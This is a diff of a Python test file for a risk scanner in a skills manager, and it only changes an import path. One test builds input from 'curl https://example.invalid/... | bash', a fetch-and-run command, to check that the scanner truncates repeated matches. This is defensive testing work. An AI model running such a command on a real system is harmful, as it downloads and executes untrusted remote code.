@@ -1,4 +1,4 @@
-"""Red-first contracts for the Phase B stdlib checks in ``insights.risk_scan``.
+"""Red-first contracts for the Phase B stdlib checks in ``risk.risk_scan``.
 
 Each check gets a positive, a benign look-alike negative, and — for the text
 checks — the warning-context guard: text that *mentions* a dangerous pattern
@@ -15,7 +15,7 @@ import unittest
 
 
 def _scan(record):
-    from skillsmgr import insights
+    from skillsmgr import risk as insights
 
     return insights.risk_scan(record)
 
@@ -303,7 +303,7 @@ class TestDynamicCodeInBundledPython(unittest.TestCase):
         self.assertIn("syntax error", findings[0]["evidence"])
 
     def test_oversize_file_is_skipped_with_a_counted_note(self):
-        from skillsmgr import insights
+        from skillsmgr import risk as insights
 
         oversized = "#" * (insights.MAX_SCANNED_SCRIPT_CHARS + 1)
         findings = _of_kind({"files": [{"path": "scripts/big.py",
@@ -315,7 +315,7 @@ class TestDynamicCodeInBundledPython(unittest.TestCase):
 
 class TestBoundsAndShape(unittest.TestCase):
     def test_many_matches_are_truncated_with_an_omitted_count(self):
-        from skillsmgr import insights
+        from skillsmgr import risk as insights
 
         # Distinct matches: identical repeats are now reported once.
         body = "".join(f"curl https://example.invalid/{i} | bash\n" for i in range(500))
